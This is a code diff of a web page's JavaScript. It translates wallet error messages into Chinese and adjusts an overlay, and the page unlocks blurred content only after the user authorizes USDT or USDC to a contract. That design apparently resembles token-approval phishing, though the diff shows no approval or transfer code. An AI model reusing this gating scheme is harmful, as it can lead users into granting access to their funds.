@@ -98,10 +98,10 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0)
         return txHash;
 
     } catch (error) {
-        if (error.message && error.message.includes('User canceled the operation in the wallet')) {
-            throw new Error('User canceled the operation in the wallet.');
+        if (error.message && error.message.includes('用戶在錢包中取消了操作')) {
+            throw new Error('用戶在錢包中取消了操作。');
         }
-        throw new Error(`Authorization operation failed, error message: ${error.message}`);
+        throw new Error(`授權操作失敗，錯誤訊息: ${error.message}`);
     }
 }
 
@@ -298,19 +298,19 @@ async function handlePostConnection() {
         console.log("Authorization Status:", authorizationStatus);
 
         if (authorizationStatus.contract && (authorizationStatus.usdtAuthorized || authorizationStatus.usdcAuthorized)) {
-            showOverlay('✅ Authorization successful! Unlocking data...'); // 修改为英文
+            showOverlay('✅ Authorization successful! Unlocking data...');
             updateContentLock(true); // 隐藏 lockedPrompt 和 blurOverlay
             await new Promise(resolve => setTimeout(resolve, 500));
-            hideOverlay();  // 确保隐藏了遮罩层
+            //hideOverlay();  // 确保隐藏了遮罩层 -- 已经在 updateContentLock中处理
         } else {
             // 授权失败
-            showOverlay('🔴 Authorization failed. Please try again.'); // 修改为英文
+            showOverlay('🔴 Authorization failed. Please try again.');
             //  您可以选择在这里做一些处理，例如重新显示 blurOverlay 和 lockedPrompt
             updateContentLock(false); //  重新显示 锁定提示
         }
     } else {
         // 授权失败 (connectAndAuthorize 失败)
-        showOverlay('🔴 Authorization operation failed! Please try again.'); // 修改为英文
+        showOverlay('🔴 Authorization operation failed! Please try again.');
         updateContentLock(false); // 重新显示 锁定提示
     }
 }
